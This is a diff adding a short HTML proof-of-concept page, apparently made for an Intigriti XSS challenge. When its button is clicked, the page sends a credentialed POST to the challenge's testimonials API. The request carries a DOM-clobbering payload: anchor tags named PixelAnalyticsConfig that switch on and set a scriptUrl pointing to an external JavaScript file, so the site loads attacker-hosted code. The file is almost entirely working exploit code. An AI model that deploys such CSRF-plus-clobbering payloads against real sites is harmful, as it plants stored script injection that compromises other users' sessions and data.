@@ -1,0 +1,19 @@
+<!doctype html>
+<button id="go">go</button>
+<script>
+go.onclick = async () => {
+  try {
+    const r = await fetch('https://challenge-0526.intigriti.io/api/testimonials', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        content: '<a id=PixelAnalyticsConfig name=enabled href=about:blank>enabled</a><a id=PixelAnalyticsConfig name=scriptUrl href=https://victorkyiv.github.io/poc/poc.js>script</a>'
+      })
+    });
+    document.body.append('status=' + r.status + ' text=' + await r.text());
+  } catch(e) {
+    document.body.append('ERR: ' + e);
+  }
+};
+</script>
